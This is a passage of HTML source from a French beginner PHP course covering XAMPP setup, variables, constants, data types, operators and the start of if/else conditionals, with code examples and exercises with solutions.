                                                <li>Tu peux écrire du HTML dans un fichier .php, mais pas l'inverse</li>
                                                <li>Les balises PHP peuvent être placées n'importe où dans le HTML</li>
                                                <li>Utilise les commentaires pour expliquer ton code complexe</li>
                                            </ul>
                                        </div>
                                    </div>

                                    <div class="test-section">
                                        <h3>🧪 Teste ton premier script</h3>
                                        <p>Place ton fichier dans le dossier <strong>htdocs</strong> de XAMPP</p>
                                        <p>Démarre le serveur Apache dans XAMPP</p>
                                        <p>Ouvre ton navigateur et va sur :</p>
                                        <div class="url-highlight">
                                            http://localhost/nom-du-fichier.php
                                        </div>
                                        <p>Si tout fonctionne, tu verras ton message s'afficher <span class="celebration">🎉</span></p>
                                        <p><strong>Conseil pro :</strong> Teste avec différents messages et observe les changements !</p>
                                    </div>
                                </div>
                            </div>
                    </section>
                    <section class="quatrieme-partie">
                        <div class="part4-php-course">
                            <div class="header-part4">
                                <h1>Variables, constantes et types de données</h1>
                                <p>Quatrième partie : Les fondations de la mémoire en PHP</p>
                            </div>

                            <div class="content">

                                <div class="intro-text">
                                    <p>Dans cette partie essentielle, tu vas découvrir comment PHP gère la mémoire à travers les <strong>variables</strong> et les <strong>constantes</strong>, ainsi que les différents <strong>types de données</strong> que tu peux manipuler.</p>
                                    <p>Il est fondamental de bien comprendre cette partie car tout programme — simple ou complexe — repose sur l’usage correct de ces éléments.</p>
                                </div>

                                <!-- VARIABLES -->
                                <section class="section">
                                    <h3>1. Qu’est-ce qu’une variable ?</h3>
                                    <p>Une <strong>variable</strong> est une zone de mémoire temporaire dans laquelle tu peux stocker une valeur (texte, chiffre, etc.). Elle peut changer au cours du programme.</p>
                                    <p>En PHP, une variable commence toujours par le symbole <code>$</code>.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$age</span> = <span class="number">24</span>;
                                        <span class="keyword">echo</span> <span class="string">"Je m'appelle $nom et j'ai $age ans."</span>;
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>Résultat :</strong> Je m'appelle Apaloh et j'ai 24 ans.</p>
                                    <p><strong>Note :</strong> Les noms de variables sont sensibles à la casse : <code>$Nom</code> ≠ <code>$nom</code>.</p>
                                </section>

                                <!-- REGLES DE NOMMAGE -->
                                <section class="section">
                                    <h3>2. Règles de nommage d'une variable</h3>
                                    <p>Pour nommer une variable, suis ces règles :</p>
                                    <ul>
                                        <li>Doit commencer par un <code>$</code>.</li>
                                        <li>Doit commencer par une lettre ou un underscore <code>_</code>, jamais par un chiffre.</li>
                                        <li>Ne doit contenir que des lettres, chiffres et underscores.</li>
                                        <li>Pas d’espaces ni de caractères spéciaux.</li>
                                    </ul>

                                    <div class="code-block">
                                        <span class="comment">// Valides</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Ali"</span>;
                                        <span class="keyword">$_age</span> = <span class="number">20</span>;

                                        <span class="comment">// Invalides</span>
                                        <span class="comment">// $2age = 20; ❌</span>
                                        <span class="comment">// $nom complet = "Ali Kone"; ❌</span>
                                    </div>
                                </section>

                                <!-- TYPES DE DONNEES -->
                                <section class="section">
                                    <h3>3. Types de données en PHP</h3>
                                    <p>PHP prend en charge plusieurs types de données pour répondre à différents besoins :</p>
                                    <ul>
                                        <li><strong>String</strong> : Chaîne de caractères (ex. un nom, une phrase).</li>
                                        <li><strong>Integer</strong> : Nombre entier (ex. 42, -10).</li>
                                        <li><strong>Float / Double</strong> : Nombre à virgule (ex. 3.14).</li>
                                        <li><strong>Boolean</strong> : Vrai (<code>true</code>) ou faux (<code>false</code>).</li>
                                        <li><strong>Array</strong> : Liste de valeurs, comme une liste de courses ou d’utilisateurs.</li>
                                        <li><strong>Object</strong> : Structure complexe utilisée en programmation orientée objet (POO).</li>
                                        <li><strong>NULL</strong> : Absence de valeur, souvent utilisé pour initialiser une variable vide.</li>
                                    </ul>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$texte</span> = <span class="string">"Bonjour"</span>; <span class="comment">// string</span>
                                        <span class="keyword">$age</span> = <span class="number">25</span>; <span class="comment">// integer</span>
                                        <span class="keyword">$prix</span> = <span class="number">19.99</span>; <span class="comment">// float</span>
                                        <span class="keyword">$estActif</span> = <span class="keyword">true</span>; <span class="comment">// boolean</span>
                                        <span class="keyword">$noms</span> = <span class="keyword">array</span>(<span class="string">"Ali"</span>, <span class="string">"Marie"</span>, <span class="string">"John"</span>); <span class="comment">// array</span>
                                        <span class="keyword">$utilisateur</span> = <span class="keyword">new</span> stdClass(); <span class="comment">// object (exemple simple)</span>
                                        <span class="keyword">$note</span> = <span class="keyword">null</span>; <span class="comment">// null</span>
                                        <span class="keyword">echo</span> <span class="string">"Exemple de tableau : "</span>, <span class="keyword">$noms</span>[0]; <span class="comment">// Affiche "Ali"</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> Un tableau peut stocker une liste d’étudiants, et un objet peut représenter un utilisateur avec des propriétés comme son nom et son email.</p>
                                </section>

                                <!-- CONSTANTES -->
                                <section class="section">
                                    <h3>4. Les constantes</h3>
                                    <p>Contrairement aux variables, une <strong>constante</strong> est une valeur fixe qui ne change jamais pendant l’exécution du script. On la définit avec la fonction <code>define()</code>.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">define</span>(<span class="string">"NOM_SITE"</span>, <span class="string">"InnovaCode"</span>);
                                        <span class="keyword">echo</span> NOM_SITE; <span class="comment">// Affiche "InnovaCode"</span>
                                        <span class="comment">// define("NOM_SITE", "NouveauNom"); // ❌ Erreur : constante déjà définie</span>
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>Remarques :</strong></p>
                                    <ul>
                                        <li>Pas de <code>$</code> pour les constantes.</li>
                                        <li>Par convention, les constantes sont écrites en MAJUSCULES.</li>
                                        <li>Utiles pour des valeurs fixes comme des noms de sites ou des configurations.</li>
                                    </ul>
                                </section>

                                <!-- CONVERSION -->
                                <section class="section">
                                    <h3>5. Conversion automatique des types</h3>
                                    <p>PHP est un langage faiblement typé : il convertit automatiquement les types de données si nécessaire.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$a</span> = <span class="number">5</span>;
                                        <span class="keyword">$b</span> = <span class="string">"10"</span>;
                                        <span class="keyword">$c</span> = <span class="keyword">$a</span> + <span class="keyword">$b</span>; <span class="comment">// Résultat : 15 (PHP convertit "10" en 10)</span>
                                        <span class="keyword">echo</span> <span class="keyword">$c</span>;
                                        <span class="tag">?></span>
                                    </div>

                                    <p><strong>⚠ Attention :</strong> La conversion automatique peut causer des bugs. Par exemple, <code>"123abc" + 5</code> donnera <code>128</code>, car PHP ignore les lettres après les chiffres.</p>
                                </section>

                                <!-- VERIFICATION DES TYPES -->
                                <section class="section">
                                    <h3>6. Vérifier le type d’une variable</h3>
                                    <p>Pour éviter les erreurs liées aux types, utilise <code>var_dump()</code> pour afficher le type et la valeur d’une variable.</p>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$valeur</span> = <span class="string">"42"</span>;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$valeur</span>); <span class="comment">// Affiche : string(2) "42"</span>
                                        <span class="keyword">$nombre</span> = <span class="number">42</span>;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$nombre</span>); <span class="comment">// Affiche : int(42)</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Conseil :</strong> Utilise <code>var_dump()</code> pour déboguer et vérifier que tes variables ont le type attendu.</p>
                                </section>

                                <!-- A RETENIR -->
                                <section class="section">
                                    <h3>📌 Points clés à retenir</h3>
                                    <div class="info-box">
                                        <ul>
                                            <li>Les variables commencent par <code>$</code> et sont sensibles à la casse.</li>
                                            <li>Les constantes se définissent avec <code>define()</code> et ne changent jamais.</li>
                                            <li>PHP gère plusieurs types de données : string, integer, float, boolean, array, object, null.</li>
                                            <li>La conversion automatique des types peut causer des erreurs inattendues.</li>
                                            <li>Utilise <code>var_dump()</code> pour vérifier le type et la valeur d’une variable.</li>
                                            <li>Commente ton code pour le rendre clair et maintenable.</li>
                                        </ul>
                                    </div>
                                </section>

                                <!-- EXERCICE -->
                                <div class="test-section">
                                    <h3>🎯 Exercice pratique</h3>
                                    <p>1. Crée un fichier <code>test.php</code> dans le dossier <code>htdocs</code>.</p>
                                    <p>2. Déclare une variable pour ton nom, ton âge et ta ville.</p>
                                    <p>3. Affiche une phrase comme : <em>"Bonjour, je suis Apaloh, j’ai 24 ans et je vis à Abidjan."</em></p>
                                    <p>4. Déclare une constante pour le nom de ton école ou projet.</p>
                                    <p>5. Essaie de modifier la constante après sa définition… Que se passe-t-il ?</p>
                                    <p>6. Utilise <code>var_dump()</code> pour vérifier le type de tes variables.</p>

                                    <p><strong>Solution exemple :</strong></p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$nom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$age</span> = <span class="number">24</span>;
                                        <span class="keyword">$ville</span> = <span class="string">"Abidjan"</span>;
                                        <span class="keyword">define</span>(<span class="string">"ECOLE"</span>, <span class="string">"InnovaCode"</span>);
                                        <span class="keyword">echo</span> <span class="string">"Bonjour, je suis $nom, j'ai $age ans et je vis à $ville."</span>;
                                        <span class="keyword">echo</span> <span class="string">"Mon école est : "</span>, ECOLE;
                                        <span class="keyword">var_dump</span>(<span class="keyword">$nom</span>, <span class="keyword">$age</span>, <span class="keyword">$ville</span>);
                                        <span class="comment">// define("ECOLE", "NouvelleEcole"); // ❌ Erreur : constante déjà définie</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Résultat attendu :</strong></p>
                                    <p>Bonjour, je suis Apaloh, j'ai 24 ans et je vis à Abidjan.<br>Mon école est : InnovaCode<br>string(6) "Apaloh"<br>int(24)<br>string(7) "Abidjan"</p>
                                </div>

                            </div>
                        </div>

                    </section>
                    <section class="part5">
                        <div class="part5-php-course">
                            <div class="header">
                                <h1>Opérateurs et expressions</h1>
                                <p>Cinquième partie : Manipuler les données et construire la logique en PHP</p>
                            </div>

                            <div class="content">

                                <div class="intro-text">
                                    <p>Dans cette partie, nous allons explorer les <strong>opérateurs</strong> et les <strong>expressions</strong>, des outils essentiels pour manipuler des données et créer la logique de tes programmes en PHP. Les opérateurs te permettent d’effectuer des calculs, de comparer des valeurs, ou de combiner des conditions, tandis que les expressions sont des combinaisons de valeurs, variables, et opérateurs qui produisent un résultat.</p>
                                    <p>Maîtriser ces concepts est crucial pour écrire des scripts dynamiques et interactifs. Chaque exemple est conçu pour être clair, et nous inclurons des bonnes pratiques pour t’aider à coder de manière efficace et lisible.</p>
                                </div>

                                <!-- INTRODUCTION -->
                                <section class="section">
                                    <h3>1. Qu’est-ce qu’une expression et un opérateur ?</h3>
                                    <p>Une <strong>expression</strong> est une combinaison de valeurs (comme des nombres ou des chaînes), de variables, et d’opérateurs qui produit un résultat. Par exemple, <code>5 + 3</code> est une expression qui donne <code>8</code>.</p>
                                    <p>Un <strong>opérateur</strong> est un symbole ou un mot-clé qui indique une opération à effectuer sur une ou plusieurs valeurs (appelées opérandes). Par exemple, dans <code>5 + 3</code>, <code>+</code> est l’opérateur, et <code>5</code> et <code>3</code> sont les opérandes.</p>
                                    <p>PHP propose plusieurs types d’opérateurs, que nous allons découvrir ci-dessous.</p>
                                </section>

                                <!-- OPERATEURS ARITHMETIQUES -->
                                <section class="section">
                                    <h3>2. Opérateurs arithmétiques</h3>
                                    <p>Les opérateurs arithmétiques permettent d’effectuer des calculs mathématiques sur des nombres (entiers ou flottants).</p>
                                    <table class="operator-table">
                                        <tr><th>Opérateur</th><th>Nom</th><th>Exemple</th><th>Résultat</th></tr>
                                        <tr><td><code>+</code></td><td>Addition</td><td><code>5 + 3</code></td><td><code>8</code></td></tr>
                                        <tr><td><code>-</code></td><td>Soustraction</td><td><code>5 - 3</code></td><td><code>2</code></td></tr>
                                        <tr><td><code>*</code></td><td>Multiplication</td><td><code>5 * 3</code></td><td><code>15</code></td></tr>
                                        <tr><td><code>/</code></td><td>Division</td><td><code>6 / 2</code></td><td><code>3</code></td></tr>
                                        <tr><td><code>%</code></td><td>Modulo (reste)</td><td><code>7 % 2</code></td><td><code>1</code></td></tr>
                                        <tr><td><code>**</code></td><td>Exponentiation</td><td><code>2 ** 3</code></td><td><code>8</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$a</span> = <span class="number">10</span>;
                                        <span class="keyword">$b</span> = <span class="number">3</span>;
                                        <span class="keyword">echo</span> <span class="string">"Addition : "</span>, <span class="keyword">$a</span> + <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 13</span>
                                        <span class="keyword">echo</span> <span class="string">"Soustraction : "</span>, <span class="keyword">$a</span> - <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 7</span>
                                        <span class="keyword">echo</span> <span class="string">"Multiplication : "</span>, <span class="keyword">$a</span> * <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 30</span>
                                        <span class="keyword">echo</span> <span class="string">"Division : "</span>, <span class="keyword">$a</span> / <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 3.333...</span>
                                        <span class="keyword">echo</span> <span class="string">"Modulo : "</span>, <span class="keyword">$a</span> % <span class="keyword">$b</span>, <span class="string">"<br>"</span>; <span class="comment">// 1</span>
                                        <span class="keyword">echo</span> <span class="string">"Exponentiation : "</span>, <span class="keyword">$a</span> ** <span class="keyword">2</span>; <span class="comment">// 100</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> Calcul du prix total d’un panier avec remise :</p>
                                    <div class="code-block">
                        <span class="tag"><?php</span>
                        <span class="keyword">$prixArticle</span> = <span class="number">50</span>;
                        <span class="keyword">$quantite</span> = <span class="number">3</span>;
                        <span class="keyword">$remise</span> = <span class="number">0.1</span>; <span class="comment">// 10% de remise</span>
                        <span class="keyword">$total</span> = <span class="keyword">$prixArticle</span> * <span class="keyword">$quantite</span> * (<span class="number">1</span> - <span class="keyword">$remise</span>);
                        <span class="keyword">echo</span> <span class="string">"Prix total après remise : $total €"</span>; <span class="comment">// 135 €</span>
                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- OPERATEURS D'AFFECTATION -->
                                <section class="section">
                                    <h3>3. Opérateurs d’affectation</h3>
                                    <p>Les opérateurs d’affectation attribuent une valeur à une variable. Le plus courant est <code>=</code>, mais il existe des variantes combinées pour simplifier les calculs.</p>
                                    <table class="operator-table">
                                        <tr><th>Opérateur</th><th>Exemple</th><th>Équivalent à</th></tr>
                                        <tr><td><code>=</code></td><td><code>$x = 5</code></td><td><code>$x = 5</code></td></tr>
                                        <tr><td><code>+=</code></td><td><code>$x += 3</code></td><td><code>$x = $x + 3</code></td></tr>
                                        <tr><td><code>-=</code></td><td><code>$x -= 3</code></td><td><code>$x = $x - 3</code></td></tr>
                                        <tr><td><code>*=</code></td><td><code>$x *= 3</code></td><td><code>$x = $x * 3</code></td></tr>
                                        <tr><td><code>/=</code></td><td><code>$x /= 3</code></td><td><code>$x = $x / 3</code></td></tr>
                                        <tr><td><code>%=</code></td><td><code>$x %= 3</code></td><td><code>$x = $x % 3</code></td></tr>
                                    </table>

                                    <div class="code-block">
                        <span class="tag"><?php</span>
                        <span class="keyword">$total</span> = <span class="number">100</span>;
                        <span class="keyword">$total</span> += <span class="number">20</span>; <span class="comment">// $total = 120</span>
                        <span class="keyword">$total</span> -= <span class="number">10</span>; <span class="comment">// $total = 110</span>
                        <span class="keyword">$total</span> *= <span class="number">2</span>; <span class="comment">// $total = 220</span>
                        <span class="keyword">echo</span> <span class="string">"Total après opérations : $total"</span>;
                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Conseil :</strong> Utilise les opérateurs combinés pour rendre ton code plus concis, mais assure-toi qu’il reste lisible.</p>
                                </section>

                                <!-- OPERATEURS DE COMPARAISON -->
                                <section class="section">
                                    <h3>4. Opérateurs de comparaison</h3>
                                    <p>Les opérateurs de comparaison comparent deux valeurs et renvoient <code>true</code> ou <code>false</code>. Ils sont souvent utilisés dans les conditions.</p>
                                    <table class="operator-table">
                                        <tr><th>Opérateur</th><th>Nom</th><th>Exemple</th><th>Résultat</th></tr>
                                        <tr><td><code>==</code></td><td>Égal</td><td><code>5 == "5"</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>===</code></td><td>Identique</td><td><code>5 === "5"</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>!=</code></td><td>Différent</td><td><code>5 != 3</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>!==</code></td><td>Non identique</td><td><code>5 !== "5"</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&lt;</code></td><td>Inférieur</td><td><code>5 &lt; 10</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&gt;</code></td><td>Supérieur</td><td><code>5 &gt; 10</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>&lt;=</code></td><td>Inférieur ou égal</td><td><code>5 &lt;= 5</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>&gt;=</code></td><td>Supérieur ou égal</td><td><code>5 &gt;= 10</code></td><td><code>false</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">18</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$age</span> == <span class="string">"18"</span> ? <span class="string">"Égal (==)"</span> : <span class="string">"Non égal"</span>;
                                        <span class="keyword">echo</span> <span class="string">"<br>"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$age</span> === <span class="string">"18"</span> ? <span class="string">"Identique (===)"</span> : <span class="string">"Non identique"</span>;
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Résultat :</strong> Égal (==)<br>Non identique</p>
                                    <p><strong>⚠ Attention :</strong> Utilise <code>===</code> pour comparer à la fois la valeur et le type, surtout avec des données provenant de formulaires.</p>
                                </section>

                                <!-- OPERATEURS LOGIQUES -->
                                <section class="section">
                                    <h3>5. Opérateurs logiques</h3>
                                    <p>Les opérateurs logiques combinent des expressions booléennes pour créer des conditions complexes.</p>
                                    <table class="operator-table">
                                        <tr><th>Opérateur</th><th>Nom</th><th>Exemple</th><th>Résultat</th></tr>
                                        <tr><td><code>&&</code></td><td>ET (AND)</td><td><code>true && false</code></td><td><code>false</code></td></tr>
                                        <tr><td><code>||</code></td><td>OU (OR)</td><td><code>true || false</code></td><td><code>true</code></td></tr>
                                        <tr><td><code>!</code></td><td>NON (NOT)</td><td><code>!true</code></td><td><code>false</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">20</span>;
                                        <span class="keyword">$estEtudiant</span> = <span class="keyword">true</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span> && <span class="keyword">$estEtudiant</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Vous êtes majeur et étudiant."</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Exemple pratique :</strong> Vérifier si un utilisateur peut bénéficier d’une réduction :</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$age</span> = <span class="number">16</span>;
                                        <span class="keyword">$carteEtudiant</span> = <span class="keyword">true</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$age</span> < <span class="number">18</span> || <span class="keyword">$carteEtudiant</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Vous avez droit à une réduction !"</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- OPERATEURS D'INCREMENTATION/DECREMENTATION -->
                                <section class="section">
                                    <h3>6. Opérateurs d’incrémentation et de décrémentation</h3>
                                    <p>Ces opérateurs modifient une variable numérique de 1.</p>
                                    <table class="operator-table">
                                        <tr><th>Opérateur</th><th>Nom</th><th>Exemple</th><th>Résultat</th></tr>
                                        <tr><td><code>++</code></td><td>Incrémentation</td><td><code>$x++</code></td><td><code>$x = $x + 1</code></td></tr>
                                        <tr><td><code>--</code></td><td>Décrémentation</td><td><code>$x--</code></td><td><code>$x = $x - 1</code></td></tr>
                                    </table>

                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$compteur</span> = <span class="number">5</span>;
                                        <span class="keyword">$compteur</span>++; <span class="comment">// $compteur = 6</span>
                                        <span class="keyword">echo</span> <span class="keyword">$compteur</span>, <span class="string">"<br>"</span>;
                                        <span class="keyword">$compteur</span>--; <span class="comment">// $compteur = 5</span>
                                        <span class="keyword">echo</span> <span class="keyword">$compteur</span>;
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Note :</strong> <code>++$x</code> (pré-incrémentation) modifie la variable avant son utilisation, tandis que <code>$x++</code> (post-incrémentation) l’utilise d’abord, puis la modifie.</p>
                                </section>

                                <!-- OPERATEUR DE CONCATENATION -->
                                <section class="section">
                                    <h3>7. Opérateur de concaténation</h3>
                                    <p>L’opérateur <code>.</code> combine deux chaînes de caractères (strings).</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prenom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">$message</span> = <span class="string">"Bonjour, "</span> . <span class="keyword">$prenom</span> . <span class="string">" !"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$message</span>; <span class="comment">// Bonjour, Apaloh !</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Alternative :</strong> Tu peux aussi utiliser des guillemets doubles pour inclure des variables directement dans une chaîne :</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prenom</span> = <span class="string">"Apaloh"</span>;
                                        <span class="keyword">echo</span> <span class="string">"Bonjour, $prenom !"</span>; <span class="comment">// Même résultat</span>
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- PRIORITE DES OPERATEURS -->
                                <section class="section">
                                    <h3>8. Priorité des opérateurs</h3>
                                    <p>PHP évalue les expressions selon une priorité définie. Par exemple, <code>*</code> est évalué avant <code>+</code>. Utilise des parenthèses <code>()</code> pour forcer l’ordre des opérations.</p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$resultat</span> = <span class="number">5</span> + <span class="number">3</span> * <span class="number">2</span>; <span class="comment">// 11 (3 * 2 = 6, puis 5 + 6)</span>
                                        <span class="keyword">$resultat2</span> = (<span class="number">5</span> + <span class="number">3</span>) * <span class="number">2</span>; <span class="comment">// 16 (5 + 3 = 8, puis 8 * 2)</span>
                                        <span class="keyword">echo</span> <span class="keyword">$resultat</span>, <span class="string">"<br>"</span>, <span class="keyword">$resultat2</span>;
                                        <span class="tag">?></span>
                                        </div>
                                    <p><strong>Conseil :</strong> Utilise toujours des parenthèses pour clarifier les expressions complexes et éviter les erreurs.</p>
                                </section>

                                <!-- BONNES PRATIQUES ET ERREURS -->
                                <section class="section">
                                    <h3>9. Bonnes pratiques et erreurs courantes</h3>
                                    <p>Voici quelques bonnes pratiques pour travailler avec les opérateurs :</p>
                                    <ul>
                                        <li><strong>Lisibilité :</strong> Espaces autour des opérateurs (ex. <code>$a + $b</code> au lieu de <code>$a+$b</code>).</li>
                                        <li><strong>Utilise === :</strong> Préférer <code>===</code> à <code>==</code> pour éviter les conversions automatiques inattendues.</li>
                                        <li><strong>Évite les divisions par zéro :</strong> Vérifie toujours le diviseur avant une division.</li>
                                        <li><strong>Commente ton code :</strong> Explique les calculs complexes ou les conditions logiques.</li>
                                    </ul>
                                    <p><strong>Erreurs courantes :</strong></p>
                                    <ul>
                                        <li><strong>Confusion entre = et == :</strong> <code>$x = 5</code> affecte une valeur, tandis que <code>$x == 5</code> compare.</li>
                                        <li><strong>Division par zéro :</strong> <code>$x / 0</code> provoque une erreur fatale.</li>
                                        <li><strong>Priorité incorrecte :</strong> Sans parenthèses, <code>5 + 3 * 2</code> donne 11, pas 16.</li>
                                    </ul>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$diviseur</span> = <span class="number">0</span>;
                                        <span class="keyword">if</span> (<span class="keyword">$diviseur</span> != <span class="number">0</span>) {
                                            <span class="keyword">echo</span> <span class="number">10</span> / <span class="keyword">$diviseur</span>;
                                        } <span class="keyword">else</span> {
                                            <span class="keyword">echo</span> <span class="string">"Erreur : Division par zéro !"</span>;
                                        }
                                        <span class="tag">?></span>
                                    </div>
                                </section>

                                <!-- A RETENIR -->
                                <section class="section">
                                    <h3>📌 Points clés à retenir</h3>
                                    <div class="info-box">
                                        <ul>
                                            <li>Les opérateurs manipulent des valeurs pour former des expressions.</li>
                                            <li>Les opérateurs arithmétiques (<code>+</code>, <code>-</code>, etc.) effectuent des calculs mathématiques.</li>
                                            <li>Les opérateurs de comparaison (<code>==</code>, <code>===</code>, etc.) renvoient <code>true</code> ou <code>false</code>.</li>
                                            <li>Les opérateurs logiques (<code>&&</code>, <code>||</code>, <code>!</code>) combinent des conditions.</li>
                                            <li>Utilise <code>.</code> pour concaténer des chaînes et <code>++</code>/<code>--</code> pour modifier des compteurs.</li>
                                            <li>Les parenthèses contrôlent la priorité des opérations.</li>
                                            <li>Adopte des bonnes pratiques : lisibilité, vérification des types, et commentaires.</li>
                                        </ul>
                                    </div>
                                </section>

                                <!-- EXERCICE -->
                                <div class="test-section">
                                    <h3>🎯 Exercice pratique</h3>
                                    <p>Crée un fichier <code>operateurs.php</code> dans le dossier <code>htdocs</code> et réalise les tâches suivantes :</p>
                                    <ol>
                                        <li>Déclare deux variables : <code>$prix</code> (un prix unitaire, ex. 25) et <code>$quantite</code> (ex. 4).</li>
                                        <li>Calcule le prix total avec une remise de 15 % et affiche-le.</li>
                                        <li>Vérifie si le prix total est supérieur à 50 et si la quantité est inférieure à 5. Si oui, affiche "Commande spéciale".</li>
                                        <li>Incrémente <code>$quantite</code> de 1 et affiche la nouvelle quantité.</li>
                                        <li>Concatène un message avec le nom du produit (ex. "T-shirt") et le prix total.</li>
                                        <li>Utilise <code>var_dump()</code> pour vérifier le type du prix total.</li>
                                    </ol>

                                    <p><strong>Solution exemple :</strong></p>
                                    <div class="code-block">
                                        <span class="tag"><?php</span>
                                        <span class="keyword">$prix</span> = <span class="number">25</span>;
                                        <span class="keyword">$quantite</span> = <span class="number">4</span>;
                                        <span class="keyword">$remise</span> = <span class="number">0.15</span>; <span class="comment">// 15%</span>
                                        <span class="keyword">$produit</span> = <span class="string">"T-shirt"</span>;

                                        <span class="comment">// Calcul du prix total avec remise</span>
                                        <span class="keyword">$total</span> = <span class="keyword">$prix</span> * <span class="keyword">$quantite</span> * (<span class="number">1</span> - <span class="keyword">$remise</span>);
                                        <span class="keyword">echo</span> <span class="string">"Prix total après remise : $total €<br>"</span>;

                                        <span class="comment">// Vérification conditionnelle</span>
                                        <span class="keyword">if</span> (<span class="keyword">$total</span> > <span class="number">50</span> && <span class="keyword">$quantite</span> < <span class="number">5</span>) {
                                            <span class="keyword">echo</span> <span class="string">"Commande spéciale<br>"</span>;
                                        }

                                        <span class="comment">// Incrémentation</span>
                                        <span class="keyword">$quantite</span>++;
                                        <span class="keyword">echo</span> <span class="string">"Nouvelle quantité : $quantite<br>"</span>;

                                        <span class="comment">// Concaténation</span>
                                        <span class="keyword">$message</span> = <span class="string">"Produit : "</span> . <span class="keyword">$produit</span> . <span class="string">", Prix total : $total €"</span>;
                                        <span class="keyword">echo</span> <span class="keyword">$message</span>, <span class="string">"<br>"</span>;

                                        <span class="comment">// Vérification du type</span>
                                        <span class="keyword">var_dump</span>(<span class="keyword">$total</span>); <span class="comment">// float(85)</span>
                                        <span class="tag">?></span>
                                    </div>
                                    <p><strong>Résultat attendu :</strong></p>
                                    <p>Prix total après remise : 85 €<br>Commande spéciale<br>Nouvelle quantité : 5<br>Produit : T-shirt, Prix total : 85 €<br>float(85)</p>
                                </div>

                            </div>
                        </div>

                    </section>
                    
            <!-- PARTIE 6 : STRUCTURES CONDITIONNELLES -->
            <section class="part6">
                <div class="part6-php-course">
                    <div class="header">
                        <h1>Structures conditionnelles (if, else, switch)</h1>
                        <p>Sixième partie : Prendre des décisions dans ton code PHP</p>
                    </div>
                    <div class="content">
                        <div class="intro-text">
                            <p>Les structures conditionnelles permettent à ton programme de prendre des décisions en fonction de certaines conditions. Elles sont essentielles pour rendre ton code dynamique et interactif.</p>
                        </div>

                        <!-- IF, ELSEIF, ELSE -->
                        <section class="section">
                            <h3>1. La structure <code>if</code></h3>
                            <p>La structure <code>if</code> permet d'exécuter un bloc de code seulement si une condition est vraie.</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$age</span> = <span class="number">18</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Vous êtes majeur."</span>;
                                }
                                <span class="tag">?></span>
                            </div>
                            <p>Ici, le message s'affiche seulement si <code>$age</code> est supérieur ou égal à 18.</p>
                        </section>

                        <section class="section">
                            <h3>2. <code>if...else</code></h3>
                            <p>Pour exécuter un code différent si la condition est fausse, utilise <code>else</code> :</p>
                            <div class="code-block">
                                <span class="tag"><?php</span>
                                <span class="keyword">$age</span> = <span class="number">16</span>;
                                <span class="keyword">if</span> (<span class="keyword">$age</span> >= <span class="number">18</span>) {
                                    <span class="keyword">echo</span> <span class="string">"Majeur"</span>;
                                } <span class="keyword">else</span> {
                                    <span class="keyword">echo</span> <span class="string">"Mineur"</span>;
                                }
